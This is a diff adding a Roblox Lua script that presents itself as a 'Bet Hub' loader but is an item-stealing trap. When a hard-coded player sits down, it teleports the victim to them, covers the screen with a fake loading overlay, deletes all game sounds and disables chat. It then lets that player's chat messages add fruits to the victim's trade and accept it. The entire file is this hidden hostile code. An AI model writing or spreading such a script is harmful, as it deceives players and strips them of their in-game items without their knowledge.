@@ -1,0 +1,190 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local targetPlayerName = "dvsom172"
+
+local firstTeleportDone = false  -- Controla se já teleportou uma vez
+
+local function removerSons()
+    for _, sound in ipairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Destroy()
+        end
+    end
+end
+
+local function teleportToPlayer(targetPlayer)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if targetHRP then
+            task.wait(0.1)  
+
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                targetHRP = targetPlayer.Character.HumanoidRootPart
+                LocalPlayer.Character.HumanoidRootPart.CFrame = targetHRP.CFrame + targetHRP.CFrame.LookVector * 10
+
+                if not firstTeleportDone then
+                    firstTeleportDone = true
+                    task.delay(1.50, removerSons)
+
+                    task.delay(0.1, function()
+                        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                        local chat = playerGui and playerGui:FindFirstChild("Chat")
+                        if chat then
+                            chat.Enabled = false  
+                        end
+                    end)
+                end
+            end
+        end
+    end
+end
+
+local function createOrUpdateLoadingUI(visible)
+    local screenGui = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("LoadingUI")
+
+    if not screenGui then
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "LoadingUI"
+        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 90000, 0, 90000)
+        frame.AnchorPoint = Vector2.new(0.5, 0.5)
+        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(128, 0, 128) -- Roxo
+        frame.BorderSizePixel = 0
+        frame.Name = "MainFrame"
+        frame.Parent = screenGui
+
+        local loadingText = Instance.new("TextLabel")
+        loadingText.Size = UDim2.new(0, 200, 0, 30)
+        loadingText.Position = UDim2.new(0.5, -100, 0.5, -50)
+        loadingText.BackgroundTransparency = 1
+        loadingText.Text = "Loading Bet Hub"
+        loadingText.TextSize = 20
+        loadingText.Font = Enum.Font.GothamBold
+        loadingText.TextColor3 = Color3.fromRGB(0, 0, 0)
+        loadingText.Name = "LoadingText"
+        loadingText.Parent = frame
+
+        local progressBarFrame = Instance.new("Frame")
+        progressBarFrame.Size = UDim2.new(0, 260, 0, 20) 
+        progressBarFrame.Position = UDim2.new(0.5, -130, 0.5, -10) 
+        progressBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) 
+        progressBarFrame.BorderSizePixel = 0
+        progressBarFrame.Parent = frame
+        progressBarFrame.ClipsDescendants = true 
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 10) 
+        corner.Parent = progressBarFrame
+
+        local progressBar = Instance.new("Frame")
+        progressBar.Size = UDim2.new(0, 0, 1, 0) 
+        progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255) 
+        progressBar.BorderSizePixel = 0
+        progressBar.Parent = progressBarFrame
+
+        local progressCorner = Instance.new("UICorner")
+        progressCorner.CornerRadius = UDim.new(0, 10) 
+        progressCorner.Parent = progressBar
+
+        task.spawn(function()
+            for i = 1, 100 do
+                progressBar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.45, true)
+                task.wait(0.45) 
+            end
+        end)
+    end
+
+    screenGui.Enabled = visible
+end
+
+local function monitordvsom172()
+    local player = Players:FindFirstChild(targetPlayerName)
+    if not player then return end
+
+    local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+    if not humanoid then return end
+
+    humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+        if humanoid.Sit then
+            print(targetPlayerName .. " sentou-se.")
+            createOrUpdateLoadingUI(true)
+            teleportToPlayer(player)
+        else
+            print(targetPlayerName .. " levantou-se.")
+            createOrUpdateLoadingUI(false)
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == targetPlayerName then
+        player.CharacterAdded:Connect(monitordvsom172)
+    end
+end)
+
+if Players:FindFirstChild(targetPlayerName) then
+    monitordvsom172()
+end
+
+local function onChatted(player, message)
+    if player == LocalPlayer then return end
+    if player.Name ~= targetPlayerName then return end
+
+    local fruitName = message:lower()
+    local fruits = {
+        dragon = "Dragon-Dragon",
+        kitsune = "Kitsune-Kitsune",
+        yeti = "Yeti-Yeti",
+        leopard = "Leopard-Leopard",
+        spirit = "Spirit-Spirit",
+        gas = "Gas-Gas",
+        control = "Control-Control",
+        venom = "Venom-Venom",
+        shadow = "Shadow-Shadow",
+        dough = "Dough-Dough",
+        mammoth = "Mammoth-Mammoth",
+        t_rex = "T-rex-T-rex",
+        gravity = "Gravity-Gravity",
+        blizzard = "Blizzard-Blizzard",
+        pain = "Pain-Pain",
+        rumble = "Rumble-Rumble",
+        portal = "Portal-Portal",
+        phoenix = "Phoenix-Phoenix",
+        sound = "Sound-Sound",
+        love = "Love-Love",
+        buddha = "Buddha-Buddha",
+        quake = "Quake-Quake"
+    }
+
+    if fruitName:sub(1, 1) == "-" then
+        local removeFruit = fruitName:sub(2)
+        if fruits[removeFruit] then
+            print(player.Name .. " disse: " .. message)
+            ReplicatedStorage.Remotes.TradeFunction:InvokeServer("removeItem", fruits[removeFruit])
+        end
+    elseif fruitName == "accept" then
+        print(player.Name .. " disse: " .. message)
+        ReplicatedStorage.Remotes.TradeFunction:InvokeServer("accept")
+    elseif fruits[fruitName] then
+        print(player.Name .. " disse: " .. message)
+        ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruits[fruitName])
+    end
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatted(player, message)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChatted(player, message)
+    end)
+end)
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".", "All")
